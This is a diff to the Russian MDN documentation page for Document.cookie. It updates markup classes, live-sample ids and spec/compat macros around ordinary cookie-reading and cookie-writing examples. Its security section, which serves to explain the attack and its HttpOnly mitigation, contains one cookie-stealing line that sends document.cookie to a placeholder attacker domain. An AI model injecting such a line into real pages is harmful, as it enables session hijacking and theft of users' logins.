@@ -17,13 +17,13 @@ translation_of: Web/API/Document/cookie
 
 <h3 id="Чтение_всех_cookies_связанных_с_текущим_документом">Чтение всех cookies, связанных с текущим документом</h3>
 
-<pre class="syntaxbox notranslate"><em>allCookies</em> = <em>document</em>.cookie;</pre>
+<pre class="syntaxbox"><em>allCookies</em> = <em>document</em>.cookie;</pre>
 
 <p>In the code above <var>allCookies</var> is a string containing a semicolon-separated list of all cookies (i.e. <code><var>key</var>=<var>value</var></code> pairs). Note that each <var>key</var> and <var>value</var> may be surrounded by whitespace (space and tab characters): in fact <a href="https://tools.ietf.org/html/rfc6265">RFC 6265</a> mandates a single space after each semicolon, but some user agents may not abide by this.</p>
 
 <h3 id="Запись_новой_cookie">Запись новой cookie</h3>
 
-<pre class="syntaxbox notranslate" id="new-cookie_syntax"><em>document</em>.cookie = <em>newCookie</em>;</pre>
+<pre class="syntaxbox" id="new-cookie_syntax"><em>document</em>.cookie = <em>newCookie</em>;</pre>
 
 <p>В приведённом коде <code>newCookie</code> - строка в виде <code><em>key</em>=<em>value</em></code><em>. </em>Заметьте, у вас есть возможность установить/обновить лишь одну связку <code><em>key</em>=<em>value</em></code> за один раз, используя этот метод.  Стоит отметить, что:</p>
 
@@ -86,21 +86,21 @@ translation_of: Web/API/Document/cookie
 
 <h3 id="Пример_1_Простое_использование">Пример #1: Простое использование</h3>
 
-<pre class="brush: js notranslate">document.cookie = "name=oeschger";
+<pre class="brush: js">document.cookie = "name=oeschger";
 document.cookie = "favorite_food=tripe";
 function alertCookie() {
   alert(document.cookie);
 }
 </pre>
 
-<pre class="brush: html notranslate">&lt;button onclick="alertCookie()"&gt;Show cookies&lt;/button&gt;
+<pre class="brush: html">&lt;button onclick="alertCookie()"&gt;Show cookies&lt;/button&gt;
 </pre>
 
-<p>{{EmbedLiveSample('Example_1_Simple_usage', 200, 36)}}</p>
+<p>{{EmbedLiveSample('Пример_1_Простое_использование', 200, 36)}}</p>
 
 <h3 id="Пример_2_Получить_cookie_с_именем_test2">Пример #2: Получить cookie с именем <em>test2</em></h3>
 
-<pre class="brush: js notranslate">document.cookie = "test1=Hello";
+<pre class="brush: js">document.cookie = "test1=Hello";
 document.cookie = "test2=World";
 
 var cookieValue = document.cookie.replace(/(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/, "$1");
@@ -110,38 +110,38 @@ function alertCookieValue() {
 }
 </pre>
 
-<pre class="brush: html notranslate">&lt;button onclick="alertCookieValue()"&gt;Show cookie value&lt;/button&gt;</pre>
+<pre class="brush: html">&lt;button onclick="alertCookieValue()"&gt;Show cookie value&lt;/button&gt;</pre>
 
-<p>{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 36)}}</p>
+<p>{{EmbedLiveSample('Пример_2_Получить_cookie_с_именем_test2', 200, 36)}}</p>
 
 <h3 id="Пример_3_Выполнить_операцию_единожды">Пример #3: Выполнить операцию единожды</h3>
 
 <p>При использовании следующего кода замените все вхождения <code>doSomethingOnlyOnce</code> (наименование cookie) на другое имя.</p>
 
-<pre class="brush: js notranslate">function doOnce() {
+<pre class="brush: js">function doOnce() {
   if (document.cookie.replace(/(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/, "$1") !== "true") {
     alert("Do something here!");
     document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
   }
 }</pre>
 
-<pre class="brush: html notranslate">&lt;button onclick="doOnce()"&gt;Only do something once&lt;/button&gt;</pre>
+<pre class="brush: html">&lt;button onclick="doOnce()"&gt;Only do something once&lt;/button&gt;</pre>
 
-<p>{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 36)}}</p>
+<p>{{EmbedLiveSample('Пример_3_Выполнить_операцию_единожды', 200, 36)}}</p>
 
 <h3 id="Пример_4_Перезагрузить_cookie">Пример #4: Перезагрузить cookie</h3>
 
-<pre class="brush: js notranslate">function resetOnce() {
+<pre class="brush: js">function resetOnce() {
   document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
 }</pre>
 
-<pre class="brush: html notranslate">&lt;button onclick="resetOnce()"&gt;Reset only once cookie&lt;/button&gt;</pre>
+<pre class="brush: html">&lt;button onclick="resetOnce()"&gt;Reset only once cookie&lt;/button&gt;</pre>
 
-<p>{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 36)}}</p>
+<p>{{EmbedLiveSample('Пример_4_Перезагрузить_cookie', 200, 36)}}</p>
 
 <h3 id="Example_5_Проверить_существование_cookie">Example #5: Проверить существование cookie</h3>
 
-<pre class="notranslate"><code>//ES5
+<pre><code>//ES5
 
 if (document.cookie.split(';').filter(function(item) {
     return item.trim().indexOf('reader=') == 0
@@ -157,7 +157,7 @@ if (document.cookie.split(';').filter((item) =&gt; item.trim().startsWith('reade
 
 <h3 id="Example_6_Проверить_что_cookie_имеет_определённое_значение">Example #6: Проверить, что cookie имеет определённое значение</h3>
 
-<pre class="notranslate"><code>//ES5
+<pre><code>//ES5
 
 if (document.cookie.split(';').filter(function(item) {
     return item.indexOf('reader=1') &gt;= 0
@@ -177,7 +177,7 @@ if (document.cookie.split(';').filter((item) =&gt; item.includes('reader=1')).le
 
 <p>Cookies are often used in web application to identify a user and their authenticated session. So stealing cookie from a web application, will lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an XSS vulnerability in the application -</p>
 
-<pre class="brush: js notranslate">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+<pre class="brush: js">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 </pre>
 
 <p>The HTTPOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about <a class="external" href="http://www.nczonline.net/blog/2009/05/12/cookies-and-security/">Cookies and Security</a>.</p>
@@ -195,7 +195,7 @@ if (document.cookie.split(';').filter((item) =&gt; item.includes('reader=1')).le
 
 <h5 id="The_server_tells_the_client_to_store_a_cookie">The server tells the client to store a cookie</h5>
 
-<pre class="eval notranslate">HTTP/1.0 200 OK
+<pre class="eval">HTTP/1.0 200 OK
 Content-type: text/html
 Set-Cookie: cookie_name1=cookie_value1
 Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
@@ -204,7 +204,7 @@ Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
 
 <h5 id="The_client_sends_back_to_the_server_its_cookies_previously_stored">The client sends back to the server its cookies previously stored</h5>
 
-<pre class="eval notranslate">GET /sample_page.html HTTP/1.1
+<pre class="eval">GET /sample_page.html HTTP/1.1
 Host: www.example.org
 Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
 Accept: */*
@@ -216,7 +216,7 @@ Accept: */*
 
 <h5 id="Library">Library</h5>
 
-<pre class="brush: js notranslate">/*\
+<pre class="brush: js">/*\
 |*|
 |*|  :: Translate relative paths to absolute paths ::
 |*|
@@ -239,7 +239,7 @@ function relPathToAbs (sRelPath) {
 
 <h5 id="Sample_usage">Sample usage</h5>
 
-<pre class="brush: js notranslate">/* Let us be in /en-US/docs/Web/API/document.cookie */
+<pre class="brush: js">/* Let us be in /en-US/docs/Web/API/document.cookie */
 
 alert(location.pathname);
 // displays: /en-US/docs/Web/API/document.cookie
@@ -260,7 +260,7 @@ alert(relPathToAbs("../Guide/././API/../../../Firefox"));
 
 <p>If you don't want to use an <em>absolute date</em> for the <code>end</code> parameter, here you can find some numeric examples of expiration-dates <em>relative to the moment of storage of the cookie</em>:</p>
 
-<pre class="brush: js notranslate">docCookies.setItem("mycookie1", "myvalue1", 864e2, "/"); // this cookie will expire in one DAY
+<pre class="brush: js">docCookies.setItem("mycookie1", "myvalue1", 864e2, "/"); // this cookie will expire in one DAY
 docCookies.setItem("mycookie2", "myvalue2", 6048e2, "/"); // this cookie will expire in one WEEK
 docCookies.setItem("mycookie3", "myvalue3", 2592e3, "/"); // this cookie will expire in one MONTH (30 days)
 docCookies.setItem("mycookie4", "myvalue4", 31536e3, "/"); // this cookie will expire in one YEAR</pre>
@@ -271,7 +271,7 @@ docCookies.setItem("mycookie4", "myvalue4", 31536e3, "/"); // this cookie will e
 
 <h4 id="Библиотека">Библиотека</h4>
 
-<pre class="notranslate"><code>function executeOnce () {
+<pre><code>function executeOnce () {
   var argc = arguments.length, bImplGlob = typeof arguments[argc - 1] === "string";
   if (bImplGlob) { argc++; }
   if (argc &lt; 3) { throw new TypeError("executeOnce - not enough arguments"); }
@@ -286,7 +286,7 @@ docCookies.setItem("mycookie4", "myvalue4", 31536e3, "/"); // this cookie will e
 
 <h4 id="Синтаксис_2">Синтаксис</h4>
 
-<pre class="notranslate">executeOnce(<var>callback</var>[, <var>thisObject</var>[, <var>argumentToPass1</var>[, <var>argumentToPass2</var>[, …[, <var>argumentToPassN</var>]]]]], <var>identifier</var>[, <var>onlyHere</var>])</pre>
+<pre>executeOnce(<var>callback</var>[, <var>thisObject</var>[, <var>argumentToPass1</var>[, <var>argumentToPass2</var>[, …[, <var>argumentToPassN</var>]]]]], <var>identifier</var>[, <var>onlyHere</var>])</pre>
 
 <h4 id="Описание">Описание</h4>
 
@@ -309,7 +309,7 @@ docCookies.setItem("mycookie4", "myvalue4", 31536e3, "/"); // this cookie will e
 
 <h4 id="Примеры_использования">Примеры использования</h4>
 
-<pre class="notranslate"><code>function alertSomething (sMsg) {
+<pre><code>function alertSomething (sMsg) {
   alert(sMsg);
 }
 
@@ -317,31 +317,11 @@ executeOnce(alertSomething, null, "Hello world!!!!", "alert_something");</code><
 
 <h2 id="Спецификации">Спецификации</h2>
 
-<table>
- <thead>
-  <tr>
-   <th scope="col">Specification</th>
-   <th scope="col">Status</th>
-   <th scope="col">Comment</th>
-  </tr>
- </thead>
- <tbody>
-  <tr>
-   <td>{{SpecName("DOM2 HTML", "html.html#ID-8747038", "Document.cookie")}}</td>
-   <td>{{Spec2("DOM2 HTML")}}</td>
-   <td>Initial definition</td>
-  </tr>
-  <tr>
-   <td>{{SpecName("Cookie Prefixes")}}</td>
-   <td>{{Spec2("Cookie Prefixes")}}</td>
-   <td></td>
-  </tr>
- </tbody>
-</table>
+{{Specifications}}
 
 <h2 id="Браузерная_поддержка">Браузерная поддержка</h2>
 
-<p>{{Compat("api.Document.cookie")}}</p>
+<p>{{Compat}}</p>
 
 <h2 id="Смотрите_также">Смотрите также</h2>
 
